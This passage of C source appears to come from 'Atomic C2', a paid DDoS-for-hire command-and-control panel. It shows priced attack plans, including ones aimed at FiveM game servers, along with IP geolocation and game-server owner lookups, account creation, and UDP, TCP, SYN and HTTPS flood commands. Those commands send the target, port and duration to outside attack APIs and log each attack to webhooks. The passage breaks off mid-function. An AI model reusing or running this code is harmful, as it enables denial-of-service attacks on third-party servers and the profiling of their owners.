				socketWrite(datafd, "\x1b\e[0m\r\n");
			}
			else if (strjcmp(Args[0], "plans") || strjcmp(Args[0], "PLANS") || strjcmp(Args[0], "prices") || strjcmp(Args[0], "PRICES"))
			{
				socketWrite(datafd, "\033[2J\033[1;1H");
				socketWrite(datafd, "\x1b\e[0m\r\n");
				socketWrite(datafd, "\e[38;2;255;0;0mAtomic Basic Prices\r\n");
				socketWrite(datafd, "\e[38;2;255;0;0mType 1.0 \e[38;2;255;0;230m| \e[38;2;255;230;0m100 secs \e[38;2;255;0;230m| \e[38;2;0;255;60m1 con \e[38;2;255;0;230m| \e[38;2;0;255;255m$20 \e[38;2;255;0;230m| \e[38;2;255;132;0mPlan Type\e[38;2;255;0;230m: \e[38;2;187;0;255mBasic\r\n");
				socketWrite(datafd, "\e[38;2;255;0;0mType 1.1 \e[38;2;255;0;230m| \e[38;2;255;230;0m100 secs \e[38;2;255;0;230m| \e[38;2;0;255;60m2 con \e[38;2;255;0;230m| \e[38;2;0;255;255m$35 \e[38;2;255;0;230m| \e[38;2;255;132;0mPlan Type\e[38;2;255;0;230m: \e[38;2;187;0;255mBasic\r\n");
				socketWrite(datafd, "\e[38;2;255;0;0mType 2.0 \e[38;2;255;0;230m| \e[38;2;255;230;0m200 secs \e[38;2;255;0;230m| \e[38;2;0;255;60m1 con \e[38;2;255;0;230m| \e[38;2;0;255;255m$40 \e[38;2;255;0;230m| \e[38;2;255;132;0mPlan Type\e[38;2;255;0;230m: \e[38;2;187;0;255mBasic\r\n");
				socketWrite(datafd, "\e[38;2;255;0;0mType 2.1 \e[38;2;255;0;230m| \e[38;2;255;230;0m200 secs \e[38;2;255;0;230m| \e[38;2;0;255;60m2 con \e[38;2;255;0;230m| \e[38;2;0;255;255m$55 \e[38;2;255;0;230m| \e[38;2;255;132;0mPlan Type\e[38;2;255;0;230m: \e[38;2;187;0;255mBasic\r\n");
				socketWrite(datafd, "\e[38;2;255;0;0mType 3.0 \e[38;2;255;0;230m| \e[38;2;255;230;0m300 secs \e[38;2;255;0;230m| \e[38;2;0;255;60m1 con \e[38;2;255;0;230m| \e[38;2;0;255;255m$60 \e[38;2;255;0;230m| \e[38;2;255;132;0mPlan Type\e[38;2;255;0;230m: \e[38;2;187;0;255mBasic\r\n");
				socketWrite(datafd, "\e[38;2;255;0;0mType 3.1 \e[38;2;255;0;230m| \e[38;2;255;230;0m300 secs \e[38;2;255;0;230m| \e[38;2;0;255;60m2 con \e[38;2;255;0;230m| \e[38;2;0;255;255m$75 \e[38;2;255;0;230m| \e[38;2;255;132;0mPlan Type\e[38;2;255;0;230m: \e[38;2;187;0;255mBasic\r\n");
				socketWrite(datafd, "\x1b\e[0m\r\n");
				socketWrite(datafd, "\e[38;2;255;0;0mAtomic FiveM Panel (FMP) Prices\r\n");
				socketWrite(datafd, "\e[38;2;255;0;0mType 4.0 \e[38;2;255;0;230m| \e[38;2;255;230;0m60  secs \e[38;2;255;0;230m| \e[38;2;0;255;60m1 con \e[38;2;255;0;230m| \e[38;2;0;255;255m$80  \e[38;2;255;0;230m| \e[38;2;255;132;0mPlan Type\e[38;2;255;0;230m: \e[38;2;187;0;255mFMP\r\n");
				socketWrite(datafd, "\e[38;2;255;0;0mType 4.1 \e[38;2;255;0;230m| \e[38;2;255;230;0m100 secs \e[38;2;255;0;230m| \e[38;2;0;255;60m1 con \e[38;2;255;0;230m| \e[38;2;0;255;255m$110 \e[38;2;255;0;230m| \e[38;2;255;132;0mPlan Type\e[38;2;255;0;230m: \e[38;2;187;0;255mFMP\r\n");
				socketWrite(datafd, "\e[38;2;255;0;0mType 5.0 \e[38;2;255;0;230m| \e[38;2;255;230;0m150 secs \e[38;2;255;0;230m| \e[38;2;0;255;60m1 con \e[38;2;255;0;230m| \e[38;2;0;255;255m$130 \e[38;2;255;0;230m| \e[38;2;255;132;0mPlan Type\e[38;2;255;0;230m: \e[38;2;187;0;255mFMP\r\n");
				socketWrite(datafd, "\e[38;2;255;0;0mType 5.1 \e[38;2;255;0;230m| \e[38;2;255;230;0m200 secs \e[38;2;255;0;230m| \e[38;2;0;255;60m1 con \e[38;2;255;0;230m| \e[38;2;0;255;255m$160 \e[38;2;255;0;230m| \e[38;2;255;132;0mPlan Type\e[38;2;255;0;230m: \e[38;2;187;0;255mFMP\r\n");
				socketWrite(datafd, "\x1b\e[0m\r\n");
				socketWrite(datafd, "\e[38;2;255;0;0mAtomic NET Addons++\r\n");
				socketWrite(datafd, "\e[38;2;255;0;0mVIP Addon \e[38;2;255;0;230m(\e[38;2;255;230;0m-PLAN TYPE: VIP\e[38;2;255;0;230m) | \e[38;2;0;255;60m$30\r\n");
				socketWrite(datafd, "\e[38;2;255;0;0mRaw-Power Addon \e[38;2;255;0;230m(\e[38;2;255;230;0m-PLAN TYPE: RAW\e[38;2;255;0;230m) | \e[38;2;0;255;60m$45\r\n");
				socketWrite(datafd, "\e[38;2;255;0;0mBlackList IP Addon\e[38;2;255;0;230m(\e[38;2;255;230;0m-PER IP\e[38;2;255;0;230m) | \e[38;2;0;255;60m$15\r\n");
				socketWrite(datafd, "\e[38;2;255;0;0mUnBan Account Addon \e[38;2;255;0;230m(\e[38;2;255;230;0m-PER ACCOUNT\e[38;2;255;0;230m) | \e[38;2;0;255;60m$20\r\n");
				socketWrite(datafd, "\x1b\e[0m\r\n");
			}

			else if (strjcmp(Args[0], "cfx") || strjcmp(Args[0], "CFX"))
			{
				char cfxCode[10], cfxBuffer[1048], cfxURLbuffer[1048];

				sprintf(cfxCode, "%s", Args[1]);

				sprintf(cfxURLbuffer, "http://68.183.124.162/api/v1/atomic/cfxlookup?cfx=%s", cfxCode);

				CURL *cfxCurl;
				CURLcode cfxResponse;

				cfxCurl = curl_easy_init();
				if (cfxCurl)
				{
					curl_easy_setopt(cfxCurl, CURLOPT_URL, cfxURLbuffer);
					curl_easy_setopt(cfxCurl, CURLOPT_FOLLOWLOCATION, 1L);
					cfxResponse = curl_easy_perform(cfxCurl);
					if (cfxResponse != CURLE_OK)
					{
						fprintf(stderr, "curl could not perform: %s\r\n", curl_easy_strerror(cfxResponse));
						curl_easy_cleanup(cfxCurl);
					}
				}

				struct json_object *cfx_parsed_json;
				struct json_object *hostname;
				struct json_object *owner;
				struct json_object *serverip;
				struct json_object *serverport;
				struct json_object *player_json;
				struct json_object *players;

				FILE *cfxJsonParse = fopen("cfxinfo.json", "r");
				fgets(cfxBuffer, sizeof(cfxBuffer), cfxJsonParse);
				fclose(cfxJsonParse);

				cfx_parsed_json = json_tokener_parse(cfxBuffer);

				json_object_object_get_ex(cfx_parsed_json, "Hostname", &hostname);
				json_object_object_get_ex(cfx_parsed_json, "Owner", &owner);
				json_object_object_get_ex(cfx_parsed_json, "ServerIP", &serverip);
				json_object_object_get_ex(cfx_parsed_json, "ServerPORT", &serverport);
				json_object_object_get_ex(cfx_parsed_json, "ServerJSON", &player_json);
				json_object_object_get_ex(cfx_parsed_json, "Online", &players);

				char hostnameBuff[100], ownerBuff[100], serveripBuff[100], serverportBuff[100], player_jsonBuff[100], playersBuff[100];

				sprintf(hostnameBuff, "%s", json_object_get_string(hostname));
				sprintf(ownerBuff, "%s", json_object_get_string(owner));
				sprintf(serveripBuff, "%s", json_object_get_string(serverip));
				sprintf(serverportBuff, "%d", json_object_get_int(serverport));
				sprintf(player_jsonBuff, "%s", json_object_get_string(player_json));
				sprintf(playersBuff, "%d", json_object_get_int(players));

				socketWrite(datafd, "\033[2J\033[1;1H");
				socketWrite(datafd, "\x1b\e[0m\r\n");

				socketWrite(datafd, "\e[38;2;255;0;0mServer\e[38;2;255;0;230m: \e[38;2;255;230;0m");
				socketWrite(datafd, hostnameBuff);
				socketWrite(datafd, "\r\n");
				socketWrite(datafd, "\e[38;2;255;0;0mOwner\e[38;2;255;0;230m: \e[38;2;255;230;0m");
				socketWrite(datafd, ownerBuff);
				socketWrite(datafd, "\r\n");
				socketWrite(datafd, "\e[38;2;255;0;0mIP\e[38;2;255;0;230m: \e[38;2;255;230;0m");
				socketWrite(datafd, serveripBuff);
				socketWrite(datafd, "\r\n");
				socketWrite(datafd, "\e[38;2;255;0;0mPort\e[38;2;255;0;230m: \e[38;2;255;230;0m");
				socketWrite(datafd, serverportBuff);
				socketWrite(datafd, "\r\n");
				socketWrite(datafd, "\e[38;2;255;0;0mPlayer Json\e[38;2;255;0;230m: \e[38;2;255;230;0m");
				socketWrite(datafd, player_jsonBuff);
				socketWrite(datafd, "\r\n");
				socketWrite(datafd, "\e[38;2;255;0;0mTotal Players Connected\e[38;2;255;0;230m: \e[38;2;255;230;0m");
				socketWrite(datafd, playersBuff);
				socketWrite(datafd, "\r\n");

				socketWrite(datafd, "\x1b\e[0m\r\n");
			}
			else if (strjcmp(Args[0], "IPLOOKUP") || strjcmp(Args[0], "iplookup"))
			{
				char ipBuffer[1048], ipCurlBuffer[1048], Buf[300];

				sprintf(Buf, "%s", Args[1]);

				if (ValidIP(Buf))
				{

					sprintf(ipCurlBuffer, "http://68.183.124.162/api/v1/atomic/iplookup?ip=%s", Buf);

					CURL *ipCurl;
					CURLcode ipResponse;

					ipCurl = curl_easy_init();
					if (ipCurl)
					{
						curl_easy_setopt(ipCurl, CURLOPT_URL, ipCurlBuffer);
						curl_easy_setopt(ipCurl, CURLOPT_FOLLOWLOCATION, 1L);
						ipResponse = curl_easy_perform(ipCurl);
						if (ipResponse != CURLE_OK)
						{
							fprintf(stderr, "curl could not perform: %s\r\n", curl_easy_strerror(ipResponse));
							curl_easy_cleanup(ipCurl);
						}
					}

					struct json_object *ip_parsed_json;
					struct json_object *country;
					struct json_object *isp;
					struct json_object *org;
					struct json_object *city;
					struct json_object *regionName;
					struct json_object *zip;
					struct json_object *countryCode;
					struct json_object *query;

					FILE *ipParseJson = fopen("iplookup.json", "r");
					fgets(ipBuffer, sizeof(ipBuffer), ipParseJson);
					fclose(ipParseJson);

					ip_parsed_json = json_tokener_parse(ipBuffer);

					json_object_object_get_ex(ip_parsed_json, "country", &country);
					json_object_object_get_ex(ip_parsed_json, "isp", &isp);
					json_object_object_get_ex(ip_parsed_json, "org", &org);
					json_object_object_get_ex(ip_parsed_json, "city", &city);
					json_object_object_get_ex(ip_parsed_json, "regionName", &regionName);
					json_object_object_get_ex(ip_parsed_json, "zip", &zip);
					json_object_object_get_ex(ip_parsed_json, "countryCode", &countryCode);
					json_object_object_get_ex(ip_parsed_json, "query", &query);

					char countryBuff[100], ispBuff[100], orgBuff[100], cityBuff[100], regionBuff[100], zipBuff[100], countryCodeBuff[100], queryBuff[100];

					sprintf(countryBuff, "%s", json_object_get_string(country));
					sprintf(ispBuff, "%s", json_object_get_string(isp));
					sprintf(orgBuff, "%s", json_object_get_string(org));
					sprintf(cityBuff, "%s", json_object_get_string(city));
					sprintf(regionBuff, "%s", json_object_get_string(regionName));
					sprintf(zipBuff, "%s", json_object_get_string(zip));
					sprintf(countryCodeBuff, "%s", json_object_get_string(countryCode));
					sprintf(queryBuff, "%s", json_object_get_string(query));

					socketWrite(datafd, "\033[2J\033[1;1H");
					socketWrite(datafd, "\x1b\e[0m\r\n");

					socketWrite(datafd, "\x1b[38;5;082mIP Valid\x1b[38;5;015m: \e[38;2;255;244;0m");
					socketWrite(datafd, Buf);
					socketWrite(datafd, "\x1b[38;5;82m ✓\x1b\e[0m\r\n");
					socketWrite(datafd, "\e[38;2;255;0;0mCountry\e[38;2;255;0;230m: \e[38;2;255;230;0m");
					socketWrite(datafd, countryBuff);
					socketWrite(datafd, "\r\n");
					socketWrite(datafd, "\e[38;2;255;0;0mISP\e[38;2;255;0;230m: \e[38;2;255;230;0m");
					socketWrite(datafd, ispBuff);
					socketWrite(datafd, "\r\n");
					socketWrite(datafd, "\e[38;2;255;0;0mOrg\e[38;2;255;0;230m: \e[38;2;255;230;0m");
					socketWrite(datafd, orgBuff);
					socketWrite(datafd, "\r\n");
					socketWrite(datafd, "\e[38;2;255;0;0mCity\e[38;2;255;0;230m: \e[38;2;255;230;0m");
					socketWrite(datafd, cityBuff);
					socketWrite(datafd, "\r\n");
					socketWrite(datafd, "\e[38;2;255;0;0mRegion\e[38;2;255;0;230m: \e[38;2;255;230;0m");
					socketWrite(datafd, regionBuff);
					socketWrite(datafd, "\r\n");
					socketWrite(datafd, "\e[38;2;255;0;0mZIP\e[38;2;255;0;230m: \e[38;2;255;230;0m");
					socketWrite(datafd, zipBuff);
					socketWrite(datafd, "\r\n");
					socketWrite(datafd, "\e[38;2;255;0;0mCountry Code\e[38;2;255;0;230m: \e[38;2;255;230;0m");
					socketWrite(datafd, countryCodeBuff);
					socketWrite(datafd, "\r\n");
					socketWrite(datafd, "\e[38;2;255;0;0mQuery\e[38;2;255;0;230m: \e[38;2;255;230;0m");
					socketWrite(datafd, queryBuff);
					socketWrite(datafd, "\r\n");

					socketWrite(datafd, "\x1b\e[0m\r\n");
				}
				else
				{
					socketWrite(datafd, "\x1b[38;5;196mIP Invalid\x1b[38;5;015m: \x1b[38;5;202m");
					socketWrite(datafd, Buf);
					socketWrite(datafd, "\x1b[38;5;196m ✗\x1b\e[0m\r\n");
				}
			}

			else if (strjcmp(Args[0], "ENCRYPT") || strjcmp(Args[0], "encrypt"))
			{
				char string[100], stringBuffer[100];

				sprintf(string, "%s", Args[1]);

				stringEncryption(string, 0xAED);

				sprintf(stringBuffer, "%s", string);

				socketWrite(datafd, "\e[38;2;255;0;0mEncrypted String: \e[38;2;255;230;0m");
				socketWrite(datafd, stringBuffer);
				socketWrite(datafd, "\x1b\e[0m\r\n");
			}
			else if (strjcmp(Args[0], "DECRYPT") || strjcmp(Args[0], "decrypt"))
			{
				char string[100], StringBuffer[100];

				sprintf(string, "%s", Args[1]);

				stringDecryption(string, 0xAED);

				sprintf(StringBuffer, "%s", string);

				socketWrite(datafd, "\e[38;2;255;0;0mEncrypted String: \e[38;2;255;230;0m");
				socketWrite(datafd, StringBuffer);
				socketWrite(datafd, "\x1b\e[0m\r\n");
			}
			else if (strjcmp(Args[0], "addusr") || strjcmp(Args[0], "ADDUSR"))
			{
				if (Users[datafd].ownerstatus == 1)
				{
					char userAddBuffer[500], syscall[1024];

					sprintf(userAddBuffer, "%s %s %s %s %s\n", Args[1], Args[2], Args[3], Args[4], Args[5]);

					FILE *userAddFP = fopen("users/LoginFile.txt", "a+");
					fputs(userAddBuffer, userAddFP);
					fclose(userAddFP);

					socketWrite(datafd, "\e[38;2;255;0;234mUser \e[38;2;255;0;230m[\e[38;2;0;255;60m");
					socketWrite(datafd, Args[1]);
					socketWrite(datafd, "\e[38;2;255;0;230m] \e[38;2;255;0;234mhas been Added to Atomic C2\r\n");

					FILE *userAddLog = fopen("Logs/AccountCreated.txt", "a+");
					fprintf(userAddLog, "User: %s | Has made an account for [%s]\n", Users[datafd].username, Args[1]);
					fclose(userAddLog);

					sprintf(syscall, "{\"content\": null,\"embeds\": [{\"title\": \"Atomic \",\"description\": \"**Account Made**\\n**Username**: __[%s]__\\n**Password**: __[xxxxx]__\\n**Status**: __[%s]__\\n**Seconds**: __[%s]__\\n**Expiry**: __[%s]__\\n**Made By**: __[%s]__\",\"color\": 5814783}]}", Args[1], Args[3], Args[4], Args[5], Users[datafd].username);
					accMadeCurl(syscall);
				}
				else
					socketWrite(datafd, "\e[38;2;255;0;0mYou do not have \e[38;2;255;0;230m[\e[38;2;0;255;60mOWNER\e[38;2;255;0;230m] \e[38;2;255;0;0mprivileges to access this feature\r\n");
			}

#ifdef basicL4
			else if (strjcmp(Args[0], "UDP") || strjcmp(Args[0], "TCP") || strjcmp(Args[0], "OVH") || strjcmp(Args[0], "NFO") || strjcmp(Args[0], "GAME"))
			{
				arglim = 4;

				arglim--;
				if (arglim < argcount)
				{
#ifdef DEBUG
					socketWrite(datafd, "\033[2J\033[1;1H");
					socketWrite(datafd, "\x1b\e[0m\r\n");
					socketWrite(datafd, "\x1b[38;5;082mEnough Arguments Provided\x1b\e[0m\r\n");
					socketWrite(datafd, "\x1b[38;5;082mUser: \e[38;2;255;244;0m");
					socketWrite(datafd, Users[datafd].username);
					socketWrite(datafd, "\r\n\x1b[38;5;082mPlan Type: \e[38;2;255;244;0m");
					socketWrite(datafd, accounts[FileLogin].status);
					socketWrite(datafd, "\r\n\x1b[38;5;082mMethod Used: \e[38;2;255;244;0m");
					socketWrite(datafd, Args[0]);
#endif
					int port = atoi(Args[2]), secs = atoi(Args[3]);

					char target[30];
					sprintf(target, "%s", Args[1]);
					trim(target);

					if (blacklistChecker(target) == 0)
					{
						socketWrite(datafd, "\r\n\x1b[38;5;082mTarget \x1b[38;5;015m[\e[38;2;255;244;0m");
						socketWrite(datafd, target);
						socketWrite(datafd, "\x1b[38;5;015m] \x1b[38;5;082mis not black-listed\r\n");
						if (ValidIP(Args[1]))
						{
							socketWrite(datafd, "\x1b[38;5;082mIP Valid\x1b[38;5;015m: \e[38;2;255;244;0m");
							socketWrite(datafd, Args[1]);
							socketWrite(datafd, "\x1b[38;5;82m ✓\x1b\e[0m\r\n");
							if (port > 0 && port < 65536)
							{
								socketWrite(datafd, "\x1b[38;5;082mPort Valid\x1b[38;5;015m: \e[38;2;255;244;0m");
								socketWrite(datafd, Args[2]);
								socketWrite(datafd, "\x1b[38;5;82m ✓\x1b\e[0m\r\n");
								if (secs > atoi(Users[datafd].secs))
								{
									socketWrite(datafd, "\x1b[38;5;196mSeconds Above Max Allowed\x1b[38;5;015m: \x1b[38;5;202m");
									socketWrite(datafd, Args[3]);
									socketWrite(datafd, "\x1b[38;5;196m ✗\x1b\e[0m\r\n");
								}
								else
								{
									socketWrite(datafd, "\x1b[38;5;082mSeconds Valid\x1b[38;5;015m: \e[38;2;255;244;0m");
									socketWrite(datafd, Args[3]);
									socketWrite(datafd, "\x1b[38;5;82m ✓\x1b\e[0m\r\n");
									// char APISend[10][1024];
									// sprintf(APISend[0], "http://198.12.120.177/nirapi.php?key=key&host=%s&port=%s&method=UDP-RAW&time=%s", Args[1], Args[2], Args[3]);
									// sprintf(APISend[1], "http://198.12.120.177/nirapi.php?key=key&host=%s&port=%s&method=UDP-RAW&time=%s", Args[1], Args[2], Args[3]);
									// sprintf(APISend[2], "http://198.12.120.177/nirapi.php?key=key&host=%s&port=%s&method=UDP-RAW&time=%s", Args[1], Args[2], Args[3]);
									// sprintf(APISend[3], "http://198.12.120.177/nirapi.php?key=key&host=%s&port=%s&method=UDP-RAW&time=%s", Args[1], Args[2], Args[3]);
									// for (i = 0; i < 4; i++)
									//{
									//	apiattack(APISend[i]);
									//	printf("API[%d]: %s\r\n", i, APISend[i]);
									// }
									char APISend[1024];
									char syscall[1024];
									sprintf(APISend, "http://%s?key=%s&host=%s&port=%s&method=%s&time=%s", bl4ip, bl4key, Args[1], Args[2], Args[0], Args[3]);
									apiattack(APISend, datafd);
									memset(APISend, sizeof(APISend), 0);

									FILE *AttackDetector = fopen("Logs/Attacks.txt", "a+");
									fprintf(AttackDetector, "User: %s | Method: %s | Target: %s | Port: %s | Time: %s\r\n", Users[datafd].username, Args[0], Args[1], Args[2], Args[3]);
									fclose(AttackDetector);

									sprintf(syscall, "{\"content\": null,\"embeds\": [{\"title\": \"Atomic \",\"description\": \"**Attack Logs**\\n**Method**: __[%s]__\\n**Target**: __[%s]__\\n**Port**: __[%s]__\\n**Time**: __[%s]__\\n**User**: __[%s]__\",\"color\": 5814783}]}", Args[0], Args[1], Args[2], Args[3], Users[datafd].username);
									attackLogCurl(syscall);
								}
							}
							else
							{
								socketWrite(datafd, "\x1b[38;5;196mPort Invalid\x1b[38;5;015m: \x1b[38;5;202m");
								socketWrite(datafd, Args[2]);
								socketWrite(datafd, "\x1b[38;5;196m ✗\x1b\e[0m\r\n");
							}
						}
						else
						{
							socketWrite(datafd, "\x1b[38;5;196mIP Invalid\x1b[38;5;015m: \x1b[38;5;202m");
							socketWrite(datafd, Args[1]);
							socketWrite(datafd, "\x1b[38;5;196m ✗\x1b\e[0m\r\n");
						}
					}
					else
					{
						socketWrite(datafd, "\r\n\x1b[38;5;196mSorry this target \x1b[38;5;015m[\e[38;2;255;244;0m");
						socketWrite(datafd, target);
						socketWrite(datafd, "\x1b[38;5;015m] \x1b[38;5;196mis black-listed!\r\n");
						socketWrite(datafd, "\e[38;2;255;0;166mPlease try another target \e[38;2;0;238;255m[\e[38;2;255;244;0m");
						socketWrite(datafd, Users[datafd].username);
						socketWrite(datafd, "\e[38;2;0;238;255m]\r\n");
						socketWrite(datafd, "\x1b\e[0m\r\n");
					}
				}
				else
				{
					socketWrite(datafd, "\r\n\x1b[38;5;196mInvalid Arguments ✗\x1b\e[0m\r\n");
					socketWrite(datafd, "\x1b[38;5;196mUser: \e[38;2;255;244;0m");
					socketWrite(datafd, Users[datafd].username);
					socketWrite(datafd, "\r\n\x1b[38;5;196mMETHOD IP PORT TIME\x1b\e[0m\r\n");
					socketWrite(datafd, "\x1b\e[0m\r\n");
				}
			}
#endif
#ifdef basicL7
			else if (strjcmp(Args[0], "HTTPS"))
			{
				regex_t url;
				int urlvalue;
				urlvalue = regcomp(&url, "(http|https)://((\\w)*|([0-9]*)|([-|_])*)+([\\.|/]((\\w)*|([0-9]*)|([-|_])*))+", REG_EXTENDED);
				arglim = 4;

				arglim--;
				if (arglim < argcount)
				{
#ifdef DEBUG
					socketWrite(datafd, "\033[2J\033[1;1H");
					socketWrite(datafd, "\x1b\e[0m\r\n");
					socketWrite(datafd, "\x1b[38;5;082mEnough Arguments Provided\x1b\e[0m\r\n");
					socketWrite(datafd, "\x1b[38;5;082mUser: \e[38;2;255;244;0m");
					socketWrite(datafd, Users[datafd].username);
					socketWrite(datafd, "\r\n\x1b[38;5;082mPlan Type: \e[38;2;255;244;0m");
					socketWrite(datafd, accounts[FileLogin].status);
					socketWrite(datafd, "\r\n\x1b[38;5;082mMethod Used: \e[38;2;255;244;0m");
					socketWrite(datafd, Args[0]);
#endif
					int port = atoi(Args[2]), secs = atoi(Args[3]), urlpass = 1;
					urlvalue = regexec(&url, Args[1], 0, NULL, 0);
					regfree(&url);
					urlpass = urlcheck(urlvalue, datafd);

					char target[30];
					sprintf(target, "%s", Args[1]);
					trim(target);

					if (blacklistChecker(target) == 0)
					{
						socketWrite(datafd, "\r\n\x1b[38;5;082mTarget \x1b[38;5;015m[\e[38;2;255;244;0m");
						socketWrite(datafd, target);
						socketWrite(datafd, "\x1b[38;5;015m] \x1b[38;5;082mis not black-listed\r\n");
						if (urlpass)
						{
							socketWrite(datafd, "\x1b[38;5;082mURL Valid\x1b[38;5;015m: \e[38;2;255;244;0m");
							socketWrite(datafd, Args[1]);
							socketWrite(datafd, "\x1b[38;5;82m ✓\x1b\e[0m\r\n");
							if (port > 0 && port < 65536)
							{
								socketWrite(datafd, "\x1b[38;5;082mPort Valid\x1b[38;5;015m: \e[38;2;255;244;0m");
								socketWrite(datafd, Args[2]);
								socketWrite(datafd, "\x1b[38;5;82m ✓\x1b\e[0m\r\n");
								if (secs > atoi(Users[datafd].secs))
								{
									socketWrite(datafd, "\x1b[38;5;196mSeconds Above Max Allowed\x1b[38;5;015m: \x1b[38;5;202m");
									socketWrite(datafd, Args[3]);
									socketWrite(datafd, "\x1b[38;5;196m ✗\x1b\e[0m\r\n");
								}
								else
								{
									socketWrite(datafd, "\x1b[38;5;082mSeconds Valid\x1b[38;5;015m: \e[38;2;255;244;0m");
									socketWrite(datafd, Args[3]);
									socketWrite(datafd, "\x1b[38;5;82m ✓\x1b\e[0m\r\n");
									// char APISend[10][1024];
									// sprintf(APISend[0], "http://198.12.120.177/nirapi.php?key=key&host=%s&port=%s&method=UDP-RAW&time=%s", Args[1], Args[2], Args[3]);
									// sprintf(APISend[1], "http://198.12.120.177/nirapi.php?key=key&host=%s&port=%s&method=UDP-RAW&time=%s", Args[1], Args[2], Args[3]);
									// sprintf(APISend[2], "http://198.12.120.177/nirapi.php?key=key&host=%s&port=%s&method=UDP-RAW&time=%s", Args[1], Args[2], Args[3]);
									// sprintf(APISend[3], "http://198.12.120.177/nirapi.php?key=key&host=%s&port=%s&method=UDP-RAW&time=%s", Args[1], Args[2], Args[3]);
									// for (i = 0; i < 4; i++)
									//{
									//	apiattack(APISend[i]);
									//	printf("API[%d]: %s\r\n", i, APISend[i]);
									// }
									char APISend[1024];
									char syscall[1024];
									sprintf(APISend, "http://%s?key=%s&host=%s&port=%s&method=%s&time=%s", bl7ip, bl7key, Args[1], Args[2], Args[0], Args[3]);
									apiattack(APISend, datafd);
									memset(APISend, sizeof(APISend), 0);

									FILE *AttackDetector = fopen("Logs/Attacks.txt", "a+");
									fprintf(AttackDetector, "User: %s | Method: %s | Target: %s | Port: %s | Time: %s\r\n", Users[datafd].username, Args[0], Args[1], Args[2], Args[3]);
									fclose(AttackDetector);

									sprintf(syscall, "{\"content\": null,\"embeds\": [{\"title\": \"Atomic \",\"description\": \"**Attack Logs**\\n**Method**: __[%s]__\\n**Target**: __[%s]__\\n**Port**: __[%s]__\\n**Time**: __[%s]__\\n**User**: __[%s]__\",\"color\": 5814783}]}", Args[0], Args[1], Args[2], Args[3], Users[datafd].username);
									attackLogCurl(syscall);
								}
							}
							else
							{
								socketWrite(datafd, "\x1b[38;5;196mPort Invalid\x1b[38;5;015m: \x1b[38;5;202m");
								socketWrite(datafd, Args[2]);
								socketWrite(datafd, "\x1b[38;5;196m ✗\x1b\e[0m\r\n");
							}
						}
						else
						{
							socketWrite(datafd, "\x1b[38;5;196mURL Invalid\x1b[38;5;015m: \x1b[38;5;202m");
							socketWrite(datafd, Args[1]);
							socketWrite(datafd, "\x1b[38;5;196m ✗\x1b\e[0m\r\n");
						}
					}
					else
					{
						socketWrite(datafd, "\r\n\x1b[38;5;196mSorry this target \x1b[38;5;015m[\e[38;2;255;244;0m");
						socketWrite(datafd, target);
						socketWrite(datafd, "\x1b[38;5;015m] \x1b[38;5;196mis black-listed!\r\n");
						socketWrite(datafd, "\e[38;2;255;0;166mPlease try another target \e[38;2;0;238;255m[\e[38;2;255;244;0m");
						socketWrite(datafd, Users[datafd].username);
						socketWrite(datafd, "\e[38;2;0;238;255m]\r\n");
						socketWrite(datafd, "\x1b\e[0m\r\n");
					}
				}
				else
				{
					socketWrite(datafd, "\r\n\x1b[38;5;196mInvalid Arguments ✗\x1b\e[0m\r\n");
					socketWrite(datafd, "\x1b[38;5;196mUser: \e[38;2;255;244;0m");
					socketWrite(datafd, Users[datafd].username);
					socketWrite(datafd, "\r\n\x1b[38;5;196mMETHOD IP PORT TIME\x1b\e[0m\r\n");
					socketWrite(datafd, "\x1b\e[0m\r\n");
				}
			}
#endif
#ifdef vipL4
			else if (strjcmp(Args[0], "FIVEM") || strjcmp(Args[0], "SYN") || strjcmp(Args[0], "CONS"))
			{
				if (Users[datafd].vipstatus == 1 || Users[datafd].adminstatus == 1 || Users[datafd].bvfmp == 1 || Users[datafd].brvfmp == 1 || Users[datafd].ownerstatus == 1 || Users[datafd].brv == 1)
				{
					arglim = 4;

					arglim--;
					if (arglim < argcount)
					{
#ifdef DEBUG
						socketWrite(datafd, "\033[2J\033[1;1H");
						socketWrite(datafd, "\x1b\e[0m\r\n");
						socketWrite(datafd, "\x1b[38;5;082mEnough Arguments Provided\x1b\e[0m\r\n");
						socketWrite(datafd, "\x1b[38;5;082mUser: \e[38;2;255;244;0m");
						socketWrite(datafd, Users[datafd].username);
						socketWrite(datafd, "\r\n\x1b[38;5;082mPlan Type: \e[38;2;255;244;0m");
						socketWrite(datafd, accounts[FileLogin].status);
						socketWrite(datafd, "\r\n\x1b[38;5;082mMethod Used: \e[38;2;255;244;0m");
						socketWrite(datafd, Args[0]);
#endif
						int port = atoi(Args[2]), secs = atoi(Args[3]);

						char target[30];
						sprintf(target, "%s", Args[1]);
						trim(target);

						if (blacklistChecker(target) == 0)
						{
							socketWrite(datafd, "\r\n\x1b[38;5;082mTarget \x1b[38;5;015m[\e[38;2;255;244;0m");
							socketWrite(datafd, target);
							socketWrite(datafd, "\x1b[38;5;015m] \x1b[38;5;082mis not black-listed\r\n");
							if (ValidIP(Args[1]))
							{
								socketWrite(datafd, "\x1b[38;5;082mIP Valid\x1b[38;5;015m: \e[38;2;255;244;0m");
								socketWrite(datafd, Args[1]);
								socketWrite(datafd, "\x1b[38;5;82m ✓\x1b\e[0m\r\n");
								if (port > 0 && port < 65536)
								{
									socketWrite(datafd, "\x1b[38;5;082mPort Valid\x1b[38;5;015m: \e[38;2;255;244;0m");
									socketWrite(datafd, Args[2]);
									socketWrite(datafd, "\x1b[38;5;82m ✓\x1b\e[0m\r\n");
									if (secs > atoi(Users[datafd].secs))
									{
										socketWrite(datafd, "\x1b[38;5;196mSeconds Above Max Allowed\x1b[38;5;015m: \x1b[38;5;202m");
										socketWrite(datafd, Args[3]);
										socketWrite(datafd, "\x1b[38;5;196m ✗\x1b\e[0m\r\n");
									}
									else
									{
										socketWrite(datafd, "\x1b[38;5;082mSeconds Valid\x1b[38;5;015m: \e[38;2;255;244;0m");
										socketWrite(datafd, Args[3]);
										socketWrite(datafd, "\x1b[38;5;82m ✓\x1b\e[0m\r\n");
										// char APISend[10][1024];
										// sprintf(APISend[0], "http://198.12.120.177/nirapi.php?key=key&host=%s&port=%s&method=UDP-RAW&time=%s", Args[1], Args[2], Args[3]);
										// sprintf(APISend[1], "http://198.12.120.177/nirapi.php?key=key&host=%s&port=%s&method=UDP-RAW&time=%s", Args[1], Args[2], Args[3]);
										// sprintf(APISend[2], "http://198.12.120.177/nirapi.php?key=key&host=%s&port=%s&method=UDP-RAW&time=%s", Args[1], Args[2], Args[3]);
										// sprintf(APISend[3], "http://198.12.120.177/nirapi.php?key=key&host=%s&port=%s&method=UDP-RAW&time=%s", Args[1], Args[2], Args[3]);
